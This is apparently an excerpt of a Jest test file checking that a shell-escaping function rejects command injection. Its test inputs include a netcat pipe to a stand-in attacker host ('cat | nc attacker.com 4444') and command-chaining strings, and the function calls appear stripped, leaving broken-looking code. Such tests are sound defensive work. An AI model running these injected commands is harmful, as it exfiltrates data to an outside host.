...
describe("Security Tests - Command Injection Prevention", () => {
  describe("", () => {
    ...
    test("should reject variable substitution ${}", () => {
      expect(() => ("${HOME}")).toThrow("dangerous pattern");
    });

    test("should reject pipe operators", () => {
      expect(() => ("cat | nc attacker.com 4444")).toThrow("dangerous pattern");
      expect(() => ("cat || nc attacker.com 4444")).toThrow("dangerous pattern");
    });

    test("should reject command chaining", () => {
      expect(() => ("cmd; malicious")).toThrow("dangerous pattern");
      expect(() => ("cmd && malicious")).toThrow("dangerous pattern");
    });
    ...
    test("should safely escape single quotes", () => {
      const result = ("it's a test");
      expect(result).toBe("'it'\\''s a test'");
    });

    test("should handle safe inputs correctly", () => {
      expect(("main")).toBe("'main'");
      expect(("feature/test-123")).toBe("'feature/test-123'");
      expect(("v1.2.3")).toBe("'v1.2.3'");
    });
  });
});
